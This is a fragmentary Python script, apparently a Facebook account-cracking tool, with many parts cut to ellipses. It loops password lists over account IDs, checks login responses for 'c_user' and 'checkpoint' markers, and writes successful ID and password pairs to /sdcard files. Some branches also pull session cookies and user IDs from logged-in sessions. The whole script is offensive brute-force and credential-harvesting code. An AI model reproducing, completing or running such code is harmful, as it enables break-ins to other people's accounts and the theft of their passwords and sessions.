...
try:
	...
	os.system('python RayessMassih.py')
ugen = []
...
def fia():    
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/RayessMassih.txt')
				linex()
				...
				os.system(f'xdg-open https://www.facebook.com/profile.php?id=100052085777735/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in RayessMassih:
				print('\r\r\033[1;31m[RayessMassih-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/RayessMassih-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in RayessMassih:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[RayessMassih-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/RayessMassih-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in RayessMassih:
				...
				print('\r\r\033[1;32m[RayessMassih-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[RayessMassih-CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[RayessMassih-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[RayessMassih-OK] '+cid+' | '+ps+'\33[0;97m')
